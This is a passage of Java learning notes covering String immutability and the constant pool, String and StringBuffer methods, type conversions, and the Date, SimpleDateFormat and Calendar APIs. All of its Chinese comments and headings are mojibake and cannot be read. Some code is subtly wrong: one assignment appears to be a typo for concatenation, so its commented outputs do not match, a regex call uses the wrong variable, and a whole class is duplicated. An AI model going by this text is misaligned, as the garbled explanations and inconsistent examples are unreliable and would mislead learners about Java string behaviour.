*5.é€šè¿‡å­—é¢é‡æ–¹å¼(åŒºåˆ«äºnew)ç»™ä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²å€¼å£°æ˜åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­,å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­æ˜¯ä¸ä¼šå­˜å‚¨ç›¸åŒå†…å®¹çš„å­—ç¬¦ä¸²çš„ */ @Test public void test1(){ String s1 = "asd"; //å­—é¢é‡ String s2 = "asd"; System.out.println(s1 == s2); //ä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œæ¯”è¾ƒs1å’Œs2çš„åœ°å€æ±  true s1 = "hello"; System.out.println(s1 == s2); //æ¯”è¾ƒs1å’Œs2çš„åœ°å€æ±  false System.out.println(s1); System.out.println(s2); String s3 = "asd"; s3 += "fgh"; System.out.println(s3); // æ‹¼æ¥äº†ï¼Œè¿˜å¾—æ–°é€ ä¸€ä¸ªï¼Œä¸èƒ½ç›´æ¥åœ¨åŸæ¥åœ°å€ä¸Šæ·»åŠ  System.out.println(s2); String s4 = "asd"; String s5 = s4.replace('a', '6'); //ä¹Ÿæ˜¯æ–°é€ ï¼Œä¸èƒ½åœ¨åŸåœ°å€åŒºè¿›è¡Œä»»ä½•ä¿®æ”¹ System.out.println(s4); System.out.println(s5); } /** * Stringçš„å®ä¾‹åŒ–æ–¹å¼ï¼š æ–¹å¼1ï¼šé€šè¿‡å­—é¢é‡å®šä¹‰çš„æ–¹å¼ æ–¹å¼2ï¼šé€šè¿‡ new + æ„é€ å™¨çš„æ–¹å¼ é¢è¯•é¢˜: string s = new String("abc");æ–¹å¼åˆ›å»ºå¯¹è±¡ï¼Œåœ¨å†…å­˜ä¸­åˆ›å»ºäº†å‡ ä¸ªå¯¹è±¡? ç­”ï¼šä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯å †ç©ºé—´ä¸­newçš„ï¼Œå¦ä¸€ä¸ªæ˜¯char[]å¯¹è±¡çš„å¸¸é‡æ± ä¸­çš„æ•°æ®"abc" */ @Test public void test2(){ //æ­¤æ—¶çš„s1å’Œs2çš„æ•°æ®æ˜¯å£°æ˜åœ¨æ–¹æ³•åŒºä¸­çš„å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ String s1 = "java"; String s2 = "java"; //é€šè¿‡ new + æ„é€ å™¨çš„æ–¹å¼ï¼š:æ­¤æ—¶çš„s3å’Œs4ä¿å­˜çš„åœ°å€å€¼ï¼Œæ˜¯æ•°æ®åœ¨å †ç©ºé—´ä¸­å¼€è¾Ÿç©ºé—´ä»¥åå¯¹åº”çš„åœ°å€å€¼ã€‚ String s3 = new String("java"); String s4 = new String("java"); System.out.println(s1 == s2); //true System.out.println(s1 == s3); //false System.out.println(s3 == s4); //false // Stringä¸­equals()æ¯”è¾ƒçš„æ˜¯å€¼ï¼Œ==æ¯”è¾ƒçš„æ˜¯åœ°å€ // é€šè¿‡å­—é¢é‡å®šä¹‰çš„strä¼šå­˜å‚¨åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ } /** * ç»“è®ºï¼š1.å¸¸é‡ä¸å¸¸é‡çš„æ‹¼æ¥ç»“æœåœ¨å¸¸é‡æ± ã€‚ä¸”å¸¸é‡æ± ä¸­ä¸ä¼šå­˜åœ¨ç›¸åŒå†…å®¹çš„å¸¸é‡ * 2.åªè¦å…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯å˜é‡ï¼Œç»“æœå°±åœ¨å †ä¸­ * 3.å¦‚æœæ‹¼æ¥çš„ç»“æœè°ƒç”¨intern()æ–¹æ³•ï¼Œè¿”å›å€¼å°±åœ¨å¸¸é‡æ± ä¸­ */ @Test public void test3() { //æ­¤æ—¶çš„s1å’Œs2çš„æ•°æ®æ˜¯å£°æ˜åœ¨æ–¹æ³•åŒºä¸­çš„å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ String s1 = "java"; String s2 = "EE"; String s3 = "javaEE"; //å­—é¢é‡ String s4 = "java" + "EE"; //å­—é¢é‡çš„è¿æ¥ï¼Œåœ¨å¸¸é‡æ± ä¸­ String s5 = s1 = "EE"; //åªè¦æœ‰å˜é‡åå‚ä¸ï¼Œå°±ä¸åœ¨å¸¸é‡æ± è€Œåœ¨å †ç©ºé—´ä¸­äº† String s6 = "java" + s2; String s7 = s1 + s2; System.out.println(s3 == s4); // true System.out.println(s3 == s5); // false System.out.println(s3 == s6);// false System.out.println(s3 == s7);// false System.out.println(s5 == s6);// false System.out.println(s5 == s7);// false System.out.println(s6 == s7);// false // intern() String s8 = s5.intern(); //è¿”å›å€¼å¾—åˆ°çš„s8ä½¿ç”¨çš„å¸¸é‡æ± ä¸­å·²ç»å­˜åœ¨çš„"javaEE" System.out.println(s3 == s8); // true } } ç»ƒä¹ ç»ƒä¹ 1ï¼š é¢è¯•é¢˜2ï¼š package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-19 14:38 * @åŠŸèƒ½ï¼šé¢è¯•é¢˜ä¸€é“ï¼Œ æ¶‰åŠStringä¸å€¼ä¼ é€’æœºåˆ¶ */ public class CaseTest { String str = new String("good"); char[] cs = {'t', 'e', 's', 't'}; public void change(String str, char ch[]){ // è¿™é‡Œå½¢å‚æ˜¯Stringï¼Œæ˜¯å¼•ç”¨å‹æ•°æ®ï¼Œä½†æ˜¯Stringæ˜¯ä¸å¯å˜çš„ï¼Œè¿™é‡Œå½¢å‚ç›¸å½“äºé€ äº†ä¸€ä¸ªå˜é‡ // ä½†æ˜¯æ˜¯æ— æ³•æ”¹å˜Stringçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯good str = "test ok"; ch[0] = 'b'; // chæ˜¯æ•°ç»„ï¼Œæ˜¯å¼•ç”¨å‹æ•°æ®ï¼Œæ˜¯åœ¨å †é‡Œçš„ï¼Œå¯ä»¥ä¿®æ”¹ï¼Œt-->b } public static void main(String[] args) { CaseTest ex = new CaseTest(); ex.change(ex.str, ex.cs); System.out.println(ex.str); // good System.out.println(ex.cs); // best } } Stringå¸¸ç”¨æ–¹æ³• package cn.xpshuai.java1; import org.junit.Test; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-19 14:51 * @åŠŸèƒ½ï¼šStringå¸¸ç”¨æ–¹æ³• */ public class StringMethodTest { @Test public void tes1(){ String s0 = "æˆ‘æ˜¯å¤§å¸…é”…"; String s1 = " Hello World "; String s2 = "I am A boy."; System.out.println(s1.length()); //é•¿åº¦ System.out.println(s1.charAt(0)); //å–ç´¢å¼•ä¸Šçš„ä¸€ä¸ªå€¼ System.out.println(s1.isEmpty()); //æ˜¯å¦ä¸ºç©º String s11 = s1.toLowerCase(); System.out.println(s11); //å°å†™çš„å­—ç¬¦ä¸² System.out.println(s1); //s1è¿˜ä¸å˜ï¼Œä»ç„¶ä¸ºåŸæ¥çš„ System.out.println(s1.toUpperCase()); //è½¬æ¢å¤§å†™ String s3 = s1.trim(); System.out.println(s3); //å»é™¤é¦–å°¾ç©ºæ ¼ï¼ˆæ³¨å†Œç”¨æˆ·å†™è¾“å…¥æ¡†çš„æ—¶å€™ï¼‰ System.out.println(s1.equalsIgnoreCase(s11)); //å¿½ç•¥å¤§å°å†™çš„æƒ…å†µä¸‹æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰ System.out.println(s1.equals(s2)); System.out.println(s1.concat("EFG")); //æ‹¼æ¥ //æ¶‰åŠåˆ°å­—ç¬¦ä¸²æ’åº System.out.println(s1.compareTo(s1)); //æ¯”è¾ƒå­—ç¬¦ä¸²å¤§å°(é€ä¸ªæ¯”è¾ƒASCIIç )ï¼Œç›¸ç­‰ä¸º0ï¼Œè´Ÿæ•°è¡¨ç¤ºå‰é¢çš„æ•°å° System.out.println(s0.substring(1)); // ä»ç´¢å¼•ä½ç½®å¼€å§‹æˆªå– System.out.println(s0.substring(1, 3)); // ä»ç´¢å¼•ä½ç½®å¼€å§‹æˆªå–åˆ°endç´¢å¼•ä½ç½®(å·¦é—­å³å¼€) } @Test public void tes2() { String s0 = "æˆ‘æ˜¯å¤§å¸…é”…"; String s1 = "Hellor World"; String s2 = "I am A boy."; String s3 = "am A boy"; boolean b1 = s1.endsWith("ld"); System.out.println(b1); boolean b2 = s1.startsWith("H"); //æ˜¯å¦ä»¥æŒ‡å®šå­—ç¬¦å¼€å§‹ System.out.println(b2); boolean b3 = s1.startsWith("ll", 2); //ä»ç´¢å¼•ä½ç½®å¼€å§‹ï¼Œæ˜¯å¦ä»¥æŒ‡å®šå­—ç¬¦å¼€å§‹ System.out.println(b3); System.out.println(s2.contains(s3)); //æ˜¯å¦åŒ…å«s3, true //è¿”å›æŒ‡å®šå­ä¸²åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°ä½ç½®çš„ç´¢å¼•(å¦‚æœæ²¡æ‰¾åˆ°ï¼Œè¿”å›-1) System.out.println(s1.indexOf("ll")); System.out.println(s1.indexOf("ll", 2)); //ä»æŒ‡å®šç´¢å¼•å¼€å§‹æ‰¾å­ä¸²(æƒ³æ‰¾å­ä¸²å‡ºç°äº†å‡ æ¬¡ï¼Œæ‰¾åˆ°ä¸€æ¬¡ä¹‹åä»ä¸Šä¸€æ¬¡æ‰¾åˆ°çš„ç´¢å¼•+å­ä¸²é•¿åº¦ç»§ç»­å¾€åæ‰¾) //ä»åå¾€å‰æ‰¾ System.out.println(s1.lastIndexOf("or")); System.out.println(s1.lastIndexOf("or", 6)); //ä»æŒ‡å®šç´¢å¼•åå‘æœç´¢ // ä»€ä¹ˆæ—¶å€™indexOfå’ŒlastIndexOfè¿”å›ç´¢å¼•ç›¸åŒï¼Ÿ // 1.å­˜åœ¨å”¯ä¸€çš„str // 2.ä¸å­˜åœ¨è¿™ä¸ªstr } @Test public void tes3() { String s0 = "æˆ‘1æ˜¯å¤§å¸…é”…"; String s1 = "Hellor World"; String s2 = "I am A boy."; String s3 = "am A boy"; //æ›¿æ¢ String s11 = s1.replace("or", "XX"); //æ›¿æ¢å­—ç¬¦ä¸²(æ‰€æœ‰å‡ºç°çš„éƒ½è¦æ›¿æ¢) String s111 = s1.replace('W', 'æ—¶'); //æ›¿æ¢å•ä¸ªå­—ç¬¦ System.out.println(s11); System.out.println(s111); String str = "12hello34world5java798mysql465"; String strr = s1.replaceAll("\\d+", ","); //æ ¹æ®æ­£åˆ™æ›¿æ¢ System.out.println(strr); // s0.replaceFirst() //åªæ›¿æ¢ç¬¬ä¸€æ¬¡ //åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ boolean System.out.println(str.matches("\\d+")); //åˆ‡ç‰‡ æ ¹æ®æ­£åˆ™ String[] s00 = s0.split("\\d+"); for (int i = 0; i &lt;s00.length ; i++) { System.out.println(s00[i]); } } } Stringä¸å…¶ä»–ç±»å‹è½¬æ¢1.Stringä¸åŸºæœ¬æ•°æ®ç±»å‹ã€åŒ…è£…ç±»ä¹‹é—´çš„è½¬æ¢ /** * 1.Stringä¸åŸºæœ¬æ•°æ®ç±»å‹ã€åŒ…è£…ç±»ä¹‹é—´çš„è½¬æ¢ * String -->åŸºæœ¬æ•°æ®ç±»å‹ã€åŒ…è£…ç±»:è°ƒç”¨åŒ…è£…ç±»çš„é™æ€æ–¹æ³•ï¼šparseXXX(str) * *åŸºæœ¬æ•°æ®ç±»å‹ã€åŒ…è£…ç±» -->Stringï¼šè°ƒç”¨Stringé‡è½½çš„valueOf(xxx) * * */ @Test public void test1(){ String s1 = "123"; //åœ¨å¸¸é‡æ± é‡Œ int n = Integer.parseInt(s1); String s2 = String.valueOf(n); String s3 = n + ""; //åœ¨å †é‡Œ } 2.Stringä¸char[]ä¹‹é—´çš„è½¬æ¢ /** * 2.Stringä¸char[]ä¹‹é—´è½¬æ¢ *String -->char[]:è°ƒç”¨Stringçš„toCharArray() *char[] --> String: è°ƒç”¨Stringçš„æ„é€ å™¨ * */ @Test public void test2(){ String s1 = "abc123"; //åœ¨å¸¸é‡æ± é‡Œ char[] c1 = s1.toCharArray(); // for (int i = 0; i &lt; c1.length; i++) { System.out.println(c1[i]); } char[] arr = new char[]{'h','e','l','l','o'}; String s2 = new String(arr); System.out.println(s2); 3.Stringä¸å­—èŠ‚æ•°ç»„byte[]ä¹‹é—´çš„è½¬æ¢ /** * 3.Stringä¸å­—èŠ‚æ•°ç»„byte[]ä¹‹é—´çš„è½¬æ¢ * ç¼–ç ï¼šString --> byte[]:è°ƒç”¨Stringçš„getBytes() * * è§£ç ï¼šbyte[] --> String: è°ƒç”¨Stringçš„æ„é€ å™¨ * * */ @Test public void test3() throws UnsupportedEncodingException { String s1 = "qwe123ä¸­å›½"; byte[] bytes = s1.getBytes(); //è½¬æ¢ä¸ºå­—èŠ‚ï¼Œä¸­æ–‡é‡‡ç”¨çš„å°±æ˜¯é»˜è®¤çš„å­—ç¬¦ç¼–ç é›†ï¼ˆæ±‰å­—åœ¨utf-8å 3ä¸ªå­—èŠ‚ï¼‰ System.out.println(Arrays.toString(bytes)); //è¿™ä¹ˆéå†è¾“å‡ºä¹Ÿå¯ä»¥ byte[] gbks = s1.getBytes("gbk"); //ä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦é›†è¿›è¡Œç¼–ç ï¼ˆæ±‰å­—åœ¨gnkå 2ä¸ªå­—èŠ‚ï¼‰ System.out.println(Arrays.toString(gbks)); //è¿™ä¹ˆéå†è¾“å‡ºä¹Ÿå¯ä»¥ String s2 = new String(bytes); // String s2 = new String(gbks); //å¦‚æœä¸ç”¨å‰é¢ç›¸åŒçš„å­—ç¬¦é›†è§£ç ï¼Œä¼šä¹±ç  System.out.println(s2); } ä¸€ä¸ªåŠ äº†finalçš„æ‹¼æ¥é—®é¢˜ï¼š @Test public void test4(){ String s1 = "javaEE"; String s2 = "java"; String s3 = s2 + "EE"; System.out.println(s1 == s3); //false final String s4 = "java"; //åŠ äº†finalï¼Œå°±æ˜¯ s4:å¸¸é‡ String s5 = s4 + "EE"; System.out.println(s1 == s5); // true } å¸¸è§ç®—æ³•é¢˜ StringBufferä¸StringBuilderä¸‰è€…åŒºåˆ«ï¼š package cn.xpshuai.java1; import org.junit.Test; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-19 16:22 * @åŠŸèƒ½ï¼šStringBufferä¸StringBuilder */ public class StringBufferTest { /** * * Stringã€StringBufferã€StringBuilderæœ‰ä½•å¼‚åŒï¼Ÿ * String: ä¸å¯å˜çš„å­—ç¬¦åºåˆ—ï¼šåº•å±‚ä½¿ç”¨char[]å­˜å‚¨ * StringBufferï¼šå¯å˜çš„å­—ç¬¦åºåˆ—ï¼šçº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡åä½ï¼šåº•å±‚ä½¿ç”¨char[]å­˜å‚¨ * StringBuilderï¼šå¯å˜çš„å­—ç¬¦åºåˆ—ï¼šçº¿ç¨‹ä¸å®‰å…¨ï¼Œæ•ˆç‡é«˜ä¸€äº›ï¼Œjdk5.0æ–°å¢ï¼šåº•å±‚ä½¿ç”¨char[]å­˜å‚¨ * * * * ä¸ºå•¥ç¬¬ä¸€ä¸ªä¸å¯å˜ï¼Œåä¿©å¯å˜å‘¢ï¼Ÿ * * * ã€æºç åˆ†æï¼šã€‘ * String s = new String(); //new char[0]; * String s1 = new String("abc"); // char value = new char[]{'a','b','c'}; * * StringBuffer sb1 = new StringBuffer(); // char value = new char[16]; åº•å±‚åˆ›å»ºäº†ä¸€ä¸ªé•¿åº¦16çš„æ•°ç»„ * System.out.println(sb1); //é•¿åº¦ä¸ºï¼š0 * sb1.append('a'); //value[0] = 'a'; *sb1.append('b'); //value[1] = 'b'; * * StringBuffer sb2 = new StringBuffer("aba"); // char value = new char["aba".length() + 16] * * é—®é¢˜1ï¼š * System.out.println(sb2.length()); // 3 * * é—®é¢˜2ï¼š * æ‰©å®¹é—®é¢˜ï¼šå¦‚æœè¦æ·»åŠ çš„æ•°æ®åº•å±‚æ•°ç»„ç››ä¸ä¸‹äº†ï¼Œé‚£å°±æ‰©å®¹åº•å±‚çš„æ•°ç»„ * é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰©å®¹ä¸ºåŸæ¥å®¹é‡çš„2å€ï¼ŒåŒæ—¶å°†åŸæœ‰æ•°ç»„ä¸­çš„å…ƒç´ å¤åˆ¶åˆ°æ–°çš„æ•°ç»„ä¸­ * * å› ä¸ºStringä¸å¯å˜ï¼Œæ‰€ä»¥ä¼˜å…ˆç”¨StringBufferå’ŒStringBuilderï¼Œå†è€ƒè™‘æœ‰æ— å¤šçº¿ç¨‹é—®é¢˜... * * * * * * * * */ @Test public void test1(){ StringBuffer sb1 = new StringBuffer("aba"); sb1.setCharAt(0, 'm'); System.out.println(sb1); } } StringBufferä¸­å¸¸ç”¨æ–¹æ³• package cn.xpshuai.java1; import org.junit.Test; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-19 16:22 * @åŠŸèƒ½ï¼šStringBufferä¸StringBuilder */ public class StringBufferTest { /** * * Stringã€StringBufferã€StringBuilderæœ‰ä½•å¼‚åŒï¼Ÿ * String: ä¸å¯å˜çš„å­—ç¬¦åºåˆ—ï¼šåº•å±‚ä½¿ç”¨char[]å­˜å‚¨ * StringBufferï¼šå¯å˜çš„å­—ç¬¦åºåˆ—ï¼šçº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡åä½ï¼šåº•å±‚ä½¿ç”¨char[]å­˜å‚¨ * StringBuilderï¼šå¯å˜çš„å­—ç¬¦åºåˆ—ï¼šçº¿ç¨‹ä¸å®‰å…¨ï¼Œæ•ˆç‡é«˜ä¸€äº›ï¼Œjdk5.0æ–°å¢ï¼šåº•å±‚ä½¿ç”¨char[]å­˜å‚¨ * * * * ä¸ºå•¥ç¬¬ä¸€ä¸ªä¸å¯å˜ï¼Œåä¿©å¯å˜å‘¢ï¼Ÿ * * * ã€æºç åˆ†æï¼šã€‘ * String s = new String(); //new char[0]; * String s1 = new String("abc"); // char value = new char[]{'a','b','c'}; * * StringBuffer sb1 = new StringBuffer(); // char value = new char[16]; åº•å±‚åˆ›å»ºäº†ä¸€ä¸ªé•¿åº¦16çš„æ•°ç»„ * System.out.println(sb1); //é•¿åº¦ä¸ºï¼š0 * sb1.append('a'); //value[0] = 'a'; *sb1.append('b'); //value[1] = 'b'; * * StringBuffer sb2 = new StringBuffer("aba"); // char value = new char["aba".length() + 16] * * é—®é¢˜1ï¼š * System.out.println(sb2.length()); // 3 * * é—®é¢˜2ï¼š * æ‰©å®¹é—®é¢˜ï¼šå¦‚æœè¦æ·»åŠ çš„æ•°æ®åº•å±‚æ•°ç»„ç››ä¸ä¸‹äº†ï¼Œé‚£å°±æ‰©å®¹åº•å±‚çš„æ•°ç»„ * é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰©å®¹ä¸ºåŸæ¥å®¹é‡çš„2å€ï¼ŒåŒæ—¶å°†åŸæœ‰æ•°ç»„ä¸­çš„å…ƒç´ å¤åˆ¶åˆ°æ–°çš„æ•°ç»„ä¸­ * * å› ä¸ºStringä¸å¯å˜ï¼Œæ‰€ä»¥ä¼˜å…ˆç”¨StringBufferå’ŒStringBuilderï¼Œå†è€ƒè™‘æœ‰æ— å¤šçº¿ç¨‹é—®é¢˜... * * * * * * * * */ @Test public void test1(){ StringBuffer sb1 = new StringBuffer("aba"); sb1.setCharAt(0, 'm'); System.out.println(sb1); } /** * StringBufferä¸­å¸¸ç”¨æ–¹æ³• *å…³æ³¨ï¼š * å¢:append(xxx) * åˆ :delete(int start, int end) * æ”¹:setCharAt(int n, char cn) / replace(int start, int end, String str) * æŸ¥: charAt(int n) * æ’å…¥:insert(int offset, xx) * é•¿åº¦:length() * éå†:for +é‡Œé¢ç”¨ charAt() / toString() æŸ¥çœ‹å†…å®¹ */ @Test public void tets2(){ StringBuffer sb1 = new StringBuffer("aba"); sb1.append(1); //æ·»åŠ æ•°æ® sb1.append("aaa"); sb1.delete(1,3); //åˆ é™¤ç´¢å¼•å†…çš„å­—ç¬¦ï¼ˆå·¦é—­å³å¼€ï¼‰ sb1.replace(1,3, "hello"); //æ›¿æ¢ç´¢å¼•å†…çš„å­—ç¬¦ï¼ˆå·¦é—­å³å¼€ï¼‰ sb1.insert(2, "H"); //åœ¨ç´¢å¼•ä½ç½®æ’å…¥æ•°æ®ï¼Œåé¢çš„æ•°æ®åç§» sb1.reverse(); //åè½¬æœ¬èº« System.out.println(sb1); sb1.indexOf("H"); //è¿”å›ç´¢å¼• String ss = sb1.substring(1,3); //è¿”å›ä¸€ä¸ªä»startåˆ°endç´¢å¼•ç»“æŸçš„å·¦é—­å³å¼€åŒºé—´çš„å­ä¸² sb1.charAt(1); // sb1.setCharAt(0, 'm'); System.out.println(sb1); } @Test public void test3(){ //ä¸‰è€…çš„æ•ˆç‡ï¼šç”±é«˜åˆ°ä½ï¼šStringBuilder > StringBuffer > String } } StringBuilderä¸­å¸¸ç”¨æ–¹æ³•æ˜¯ç±»ä¼¼çš„ï¼Œåªä¸è¿‡åŠ äº†åŒæ­¥æ–¹æ³• ä¸‰è€…æ•ˆç‡ç”±é«˜åˆ°ä½ï¼šStringBuilder &gt; StringBuffer &gt; String æ—¶é—´ç±»JDK8ä¹‹å‰æ—¥æœŸå’Œä¹‹é—´API package cn.xpshuai.java2; import org.junit.Test; import java.util.Date; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-19 17:19 * @åŠŸèƒ½ï¼š JDK8ä¹‹å‰æ—¥æœŸå’Œæ—¶é—´çš„APIæµ‹è¯• */ public class DateTimeAPI { // 1.Systemç±»ä¸­çš„currentTimeMillis() @Test public void test1() { long time = System.currentTimeMillis(); //è¿”å›æœ‰è®¡ç®—æœºå…ƒå¹´ä¹‹é—´ä»¥æ¯«ç§’ä¸ºå•ä½çš„æ—¶é—´å·®, æ—¶é—´æˆ³ System.out.println(time); } /** * java.util.Dateç±» * | --- java.sql.Dateç±»(å¯¹åº”æ•°æ®åº“ä¸­çš„æ—¥æœŸç±»å‹çš„å˜é‡) * * java.util.Dateç±»ï¼š * 1.ä¸¤ä¸ªæ„é€ å™¨çš„ä½¿ç”¨ * Date() * Date(1611048522028L); * 2.ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ï¼š * getTime()ï¼šè·å–å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ * toString()ï¼šæ˜¾ç¤ºå½“å‰æ—¶é—´ * * * java.sql.Dateç±» * 1.å¦‚ä½•å®ä¾‹åŒ– * 2.å¦‚æœæœ‰sql.Dateï¼Œå¦‚ä½•è½¬æ¢ä¸ºutil.Dateå¯¹è±¡ -->å¤šæ€èµ‹å€¼å°±è¡Œ * 3.util.Dateï¼Œå¦‚ä½•è½¬æ¢ä¸ºsql.Dateå¯¹è±¡(çˆ¶ç±»å¾€å­ç±»è½¬) * * */ @Test public void test2() { // æ„é€ å™¨1 Date date1 = new Date(); System.out.println(date1.toString()); // Tue Jan 19 17:28:03 CST 2021 System.out.println(date1.getTime()); //longå‹æ˜¯å€¼ï¼Œæ¯«ç§’æ•°ï¼Œæ—¶é—´æˆ³ // æ„é€ å™¨2:åˆ›å»ºæŒ‡å®šæ¯«ç§’æ•°çš„Dateå¯¹è±¡ Date date2 = new Date(1611048522028L); System.out.println(date2.toString()); // Tue Jan 19 17:28:03 CST 2021 //åˆ›å»ºjava.sql.Dateå¯¹è±¡ java.sql.Date date3 = new java.sql.Date(1611048522028L); System.out.println(date3); //util.Dateï¼Œå¦‚ä½•è½¬æ¢ä¸ºsql.Dateå¯¹è±¡(çˆ¶ç±»å¾€å­ç±»è½¬) // æƒ…å†µ1 // Date date4 = new java.sql.Date(1611048522028L); // java.sql.Date date5 = (java.sql.Date)date4; // æƒ…å†µ2ï¼š Date date6 = new Date(); java.sql.Date date7 = new java.sql.Date(date6.getTime()); } } java.text.SimpleDateFormatç±» Dateç±»çš„APIä¸æ˜“äºå›½é™…åŒ–ï¼Œå¤§éƒ¨åˆ†è¢«åºŸå¼ƒäº†ï¼Œjava.text.SimpleDateFormatç±»æ˜¯ä¸€ä¸ªä¸ä¸è¯­è¨€ç¯å¢ƒæœ‰å…³çš„æ–¹å¼æ¥æ ¼å¼åŒ–å’Œè§£ææ—¥æœŸçš„å…·ä½“ç±»ã€‚ å®ƒå…è®¸è¿›è¡Œæ ¼å¼åŒ–:æ—¥æœŸâ†’æ–‡æœ¬ã€è§£æ:æ–‡æœ¬â†’æ—¥æœŸ æ ¼å¼åŒ–: simpleDateFormat() : //é»˜è®¤çš„æ¨¡å¼å’Œè¯­è¨€ç¯å¢ƒåˆ›å»ºå¯¹è±¡ public SimpleDateFormat(String pattern): //è¯¥æ„é€ æ–¹æ³•å¯ä»¥ç”¨å‚æ•°patternæŒ‡å®šçš„æ ¼å¼åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡è°ƒç”¨: public String format(Date date): //æ–¹æ³•æ ¼å¼åŒ–æ—¶é—´å¯¹è±¡date è§£æ: public Date parse(String source): //ä»ç»™å®šå­—ç¬¦ä¸²çš„å¼€å§‹è§£ææ–‡æœ¬ï¼Œä»¥ç”Ÿæˆä¸€ä¸ªæ—¥æœŸ java.util.Calendarç±»ï¼š Calendaræ˜¯ä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼Œä¸»ç”¨ç”¨äºå®Œæˆæ—¥æœŸå­—æ®µä¹‹é—´ç›¸äº’æ“ä½œçš„åŠŸèƒ½. è·å–Calendarå®ä¾‹çš„æ–¹æ³• ä½¿ç”¨Calendar.getInstance()æ–¹æ³• è°ƒç”¨å®ƒçš„å­ç±»GregorianCalendarçš„æ„é€ å™¨ã€‚ ä¸€ä¸ªCalendarçš„å®ä¾‹æ˜¯ç³»ç»Ÿæ—¶é—´çš„æŠ½è±¡è¡¨ç¤ºï¼Œé€šè¿‡get(int field)æ–¹æ³•æ¥å–å¾—æƒ³è¦çš„æ—¶é—´ä¿¡æ¯ã€‚æ¯”å¦‚YEARã€MONTHã€DAY_OF_WEEKã€HOUR_OF_DAYMINUTEã€SECOND public void set(int field,int value) public void add(int field,int amount) public final Date getTime() public final void setTime(Date date) æ³¨æ„: è·å–æœˆä»½æ—¶:ä¸€æœˆæ˜¯0ï¼ŒäºŒæœˆæ˜¯1ï¼Œä»¥æ­¤ç±»æ¨ï¼Œ12æœˆæ˜¯11 è·å–æ˜ŸæœŸæ—¶:å‘¨æ—¥æ˜¯1ï¼Œå‘¨äºŒæ˜¯2ï¼Œã€‚ã€‚ã€‚ã€‚å‘¨å…­æ˜¯7 package cn.xpshuai.java2; import org.junit.Test; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Calendar; import java.util.Date; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-23 21:35 * @åŠŸèƒ½ï¼š * * * 1.systemçš„currentTImeMills() * 2. java.util.Dateå’Œjava.sql.Date * 3.java.util.SimpleDateFormat * 4.Calendar */ public class SimpleDateFormatTest { /* SimpleDateFormat: å¯¹æ—¥æœŸDateç±»çš„æ ¼å¼åŒ–å’Œè§£æ æ ¼å¼åŒ–ï¼šæ—¥æœŸ-->å­—ç¬¦ä¸² è§£æ: å­—ç¬¦ä¸² --> æ—¥æœŸ */ @Test public void testSimpleDateFormat() throws ParseException { //å®ä¾‹åŒ–ï¼šä½¿ç”¨é»˜è®¤æ„é€ å™¨ SimpleDateFormat sdf = new SimpleDateFormat(); //æ ¼å¼åŒ– Date date = new Date(); String format_Str = sdf.format(date); System.out.println(format_Str); //è§£æ String str = "2020-12-30 ä¸Šåˆ8:11"; Date date1 = sdf.parse(str); //æŠ›å¼‚å¸¸ System.out.println(date1); System.out.println(date1.getTime()); System.out.println("**********"); //å®ä¾‹åŒ–ï¼šè°ƒç”¨å¸¦å‚æ„é€ å™¨(å¼€å‘ä¸­è¿™ä¹ˆæŒ‡å®šæ ¼å¼çš„æ–¹å¼ç”¨å¾—å¤š) SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss"); String str2 = sdf2.format(date); System.out.println(str2); //è§£æ: è¦æ±‚å­—ç¬¦ä¸²å¿…é¡»ç¬¦åˆé€šè¿‡æ„é€ å™¨å‚æ•°ä½“ç°çš„è¿™ä¸ªå®ä¾‹çš„æ ¼å¼ System.out.println(sdf2.parse("2021-01-23 09:47:37")); } /* Calendar æ—¥å†ç±» */ @Test public void testCalendar(){ //1.å®ä¾‹åŒ– //æ–¹å¼1: åˆ›å»ºå…¶å­ç±»(GregorianCalendar)çš„å¯¹è±¡ //æ–¹å¼2: è°ƒç”¨å®ƒçš„é™æ€æ–¹æ³•: getInstance() -- å¸¸ç”¨ Calendar calendar = Calendar.getInstance(); System.out.println(calendar.getClass()); //2.å¸¸ç”¨æ–¹æ³• //get() int days = calendar.get(Calendar.DAY_OF_MONTH); //å½“å‰æ—¶é—´æ˜¯è¿™ä¸ªæœˆçš„ç¬¬å‡ å¤© System.out.println(days); System.out.println(calendar.get(Calendar.DAY_OF_YEAR)); // å½“å‰æ˜¯è¿™ä¸ªå¹´çš„ç¬¬å‡ å¤© //set() calendar.set(Calendar.DAY_OF_MONTH, 22); //ä¿®æ”¹å€¼ int days2 = calendar.get(Calendar.DAY_OF_MONTH); System.out.println(days2); //ç°åœ¨æœ¬èº«å·²ç»æ”¹äº†(å¯å˜çš„) //add() calendar.add(Calendar.DAY_OF_MONTH, 3); //åœ¨åŸåŸºç¡€åŠ ä¸Šä¸‰å¤© 